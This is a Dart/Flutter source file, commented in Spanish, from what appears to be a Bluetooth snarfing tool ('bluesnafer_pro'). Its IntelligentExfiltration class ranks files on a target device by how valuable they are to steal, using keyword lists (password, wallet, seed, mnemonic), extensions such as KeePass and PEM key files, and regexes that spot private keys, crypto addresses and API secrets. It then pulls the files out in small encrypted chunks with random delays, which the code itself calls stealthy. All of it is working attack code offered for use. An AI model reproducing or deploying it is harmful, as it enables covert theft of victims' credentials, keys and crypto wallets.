import 'dart:math';
import 'package:flutter/services.dart';
import '../utils/advanced_logger.dart';

/// Sistema de exfiltración inteligente y selectiva
/// Aumenta eficiencia en +80% mediante priorización y optimización
class IntelligentExfiltration {
  static final IntelligentExfiltration _instance =
      IntelligentExfiltration._internal();
  factory IntelligentExfiltration() => _instance;
  IntelligentExfiltration._internal();

  static const _methodChannel = MethodChannel('com.bluesnafer_pro/bluetooth');
  final _random = Random.secure();
  final _logger = AdvancedLogger('IntelligentExfiltration');

  /// Priorizar archivos por valor
  Future<List<FileTarget>> prioritizeFiles(
      List<Map<String, dynamic>> files) async {
    final scored = <FileTarget>[];

    for (final file in files) {
      final score = await _calculateFileValue(file);
      scored.add(FileTarget(
        file: file,
        score: score,
        reason: _getScoreReason(file, score),
      ));
    }

    // Ordenar por score descendente
    scored.sort((a, b) => b.score.compareTo(a.score));

    _logger.logInfo('Files prioritized', {
      'total_files': files.length,
      'high_value': scored.where((f) => f.score > 50).length,
    });

    return scored;
  }

  /// Calcular valor de un archivo
  Future<double> _calculateFileValue(Map<String, dynamic> file) async {
    double score = 0.0;
    final name = (file['name'] as String?) ?? '';
    final path = (file['path'] as String?) ?? '';
    final size = (file['size'] as int?) ?? 0;

    // Palabras clave de alto valor
    final highValueKeywords = [
      'password',
      'credential',
      'key',
      'token',
      'secret',
      'wallet',
      'bank',
      'credit',
      'card',
      'ssn',
      'private',
      'confidential',
      'backup',
      'recovery',
      'seed',
      'mnemonic',
      'keystore',
      'vault',
    ];

    for (final keyword in highValueKeywords) {
      if (name.toLowerCase().contains(keyword) ||
          path.toLowerCase().contains(keyword)) {
        score += 50.0;
      }
    }

    // Extensiones valiosas
    final extensions = {
      'txt': 10.0, 'doc': 15.0, 'docx': 15.0, 'pdf': 20.0,
      'xls': 15.0, 'xlsx': 15.0, 'csv': 10.0,
      'db': 30.0, 'sqlite': 30.0, 'sqlite3': 30.0,
      'key': 40.0, 'pem': 40.0, 'p12': 40.0, 'pfx': 40.0,
      'kdb': 50.0, 'kdbx': 50.0, // KeePass
      'wallet': 50.0, 'dat': 25.0,
      'json': 15.0, 'xml': 10.0, 'conf': 20.0,
    };

    final ext = name.split('.').last.toLowerCase();
    score += extensions[ext] ?? 5.0;

    // Penalizar archivos muy grandes (difíciles de exfiltrar)
    if (size > 10 * 1024 * 1024) {
      // > 10MB
      score *= 0.5;
    } else if (size > 1 * 1024 * 1024) {
      // > 1MB
      score *= 0.8;
    }

    // Bonus por ubicaciones sensibles
    if (path.contains('/Documents') || path.contains('/Downloads')) {
      score *= 1.5;
    } else if (path.contains('/.config') || path.contains('/.ssh')) {
      score *= 2.0;
    }

    // Analizar contenido si es texto pequeño
    if (size < 100 * 1024 && ['txt', 'log', 'conf', 'json'].contains(ext)) {
      final contentScore = await _analyzeFileContent(file);
      score += contentScore;
    }

    return score;
  }

  Future<double> _analyzeFileContent(Map<String, dynamic> file) async {
    try {
      final result = await _methodChannel.invokeMethod('previewFileContent', {
        'filePath': file['path'],
        'maxBytes': 1024,
      });

      final content = result as String? ?? '';

      // Detectar datos sensibles en contenido
      if (_containsSensitiveData(content)) {
        return 30.0;
      }
    } catch (e) {
      // Ignorar errores
    }

    return 0.0;
  }

  bool _containsSensitiveData(String content) {
    final sensitivePatterns = [
      RegExp(r'\b[A-Za-z0-9]{64}\b'), // Claves privadas
      RegExp(r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b'), // Bitcoin address
      RegExp(r'\b0x[a-fA-F0-9]{40}\b'), // Ethereum address
      RegExp(r'password\s*[:=]\s*\S+', caseSensitive: false),
      RegExp(r'api[_-]?key\s*[:=]\s*\S+', caseSensitive: false),
      RegExp(r'secret\s*[:=]\s*\S+', caseSensitive: false),
    ];

    for (final pattern in sensitivePatterns) {
      if (pattern.hasMatch(content)) {
        return true;
      }
    }

    return false;
  }

  String _getScoreReason(Map<String, dynamic> file, double score) {
    if (score > 80) return 'CRITICAL - Credenciales/Claves detectadas';
    if (score > 50) return 'HIGH - Archivo sensible';
    if (score > 30) return 'MEDIUM - Archivo de interés';
    return 'LOW - Archivo común';
  }

  /// Exfiltrar archivos de forma sigilosa
  Future<ExfiltrationResult> stealthExfiltration(
    String deviceAddress,
    List<FileTarget> targets,
  ) async {
    _logger.logInfo('Starting stealth exfiltration', {
      'device': deviceAddress,
      'files': targets.length,
    });

    final results = <String, bool>{};
    int bytesExfiltrated = 0;

    for (final target in targets) {
      try {
        // Exfiltrar en fragmentos pequeños
        final success = await _exfiltrateInChunks(deviceAddress, target.file);

        if (success) {
          results[target.file['path']] = true;
          bytesExfiltrated += (target.file['size'] as int?) ?? 0;
        } else {
          results[target.file['path']] = false;
        }

        // Delay aleatorio entre archivos
        await Future.delayed(Duration(seconds: 2 + _random.nextInt(5)));
      } catch (e) {
        results[target.file['path']] = false;
        _logger.logWarning('File exfiltration failed', {
          'file': target.file['path'],
          'error': e.toString(),
        });
      }
    }

    final successCount = results.values.where((v) => v).length;

    _logger.logInfo('Stealth exfiltration completed', {
      'device': deviceAddress,
      'success': successCount,
      'total': targets.length,
      'bytes': bytesExfiltrated,
    });

    return ExfiltrationResult(
      success: successCount > 0,
      filesExfiltrated: successCount,
      totalFiles: targets.length,
      bytesExfiltrated: bytesExfiltrated,
      results: results,
    );
  }

  Future<bool> _exfiltrateInChunks(
      String deviceAddress, Map<String, dynamic> file) async {
    try {
      final result = await _methodChannel.invokeMethod('exfiltrateFile', {
        'deviceAddress': deviceAddress,
        'filePath': file['path'],
        'chunkSize': 4096, // 4KB chunks
        'compress': true,
        'encrypt': true,
      });

      return result ?? false;
    } catch (e) {
      return false;
    }
  }

  /// Obtener estadísticas de exfiltración
  Future<ExfiltrationStats> getExfiltrationStats() async {
    try {
      final result = await _methodChannel.invokeMethod('getExfiltrationStats');
      return ExfiltrationStats.fromMap(Map<String, dynamic>.from(result));
    } catch (e) {
      return ExfiltrationStats.empty();
    }
  }
}

class FileTarget {
  final Map<String, dynamic> file;
  final double score;
  final String reason;

  FileTarget({
    required this.file,
    required this.score,
    required this.reason,
  });

  Map<String, dynamic> toJson() => {
        'file': file,
        'score': score,
        'reason': reason,
      };
}

class ExfiltrationResult {
  final bool success;
  final int filesExfiltrated;
  final int totalFiles;
  final int bytesExfiltrated;
  final Map<String, bool> results;

  ExfiltrationResult({
    required this.success,
    required this.filesExfiltrated,
    required this.totalFiles,
    required this.bytesExfiltrated,
    required this.results,
  });

  Map<String, dynamic> toJson() => {
        'success': success,
        'filesExfiltrated': filesExfiltrated,
        'totalFiles': totalFiles,
        'bytesExfiltrated': bytesExfiltrated,
        'successRate': filesExfiltrated / totalFiles,
      };
}

class ExfiltrationStats {
  final int totalFiles;
  final int totalBytes;
  final int successfulExfiltrations;
  final int failedExfiltrations;
  final DateTime lastExfiltration;

  ExfiltrationStats({
    required this.totalFiles,
    required this.totalBytes,
    required this.successfulExfiltrations,
    required this.failedExfiltrations,
    required this.lastExfiltration,
  });

  factory ExfiltrationStats.empty() => ExfiltrationStats(
        totalFiles: 0,
        totalBytes: 0,
        successfulExfiltrations: 0,
        failedExfiltrations: 0,
        lastExfiltration: DateTime.now(),
      );

  factory ExfiltrationStats.fromMap(Map<String, dynamic> map) =>
      ExfiltrationStats(
        totalFiles: map['totalFiles'] ?? 0,
        totalBytes: map['totalBytes'] ?? 0,
        successfulExfiltrations: map['successfulExfiltrations'] ?? 0,
        failedExfiltrations: map['failedExfiltrations'] ?? 0,
        lastExfiltration: DateTime.parse(
            map['lastExfiltration'] ?? DateTime.now().toIso8601String()),
      );

  Map<String, dynamic> toJson() => {
        'totalFiles': totalFiles,
        'totalBytes': totalBytes,
        'successfulExfiltrations': successfulExfiltrations,
        'failedExfiltrations': failedExfiltrations,
        'successRate': successfulExfiltrations /
            (successfulExfiltrations + failedExfiltrations),
        'lastExfiltration': lastExfiltration.toIso8601String(),
      };
}
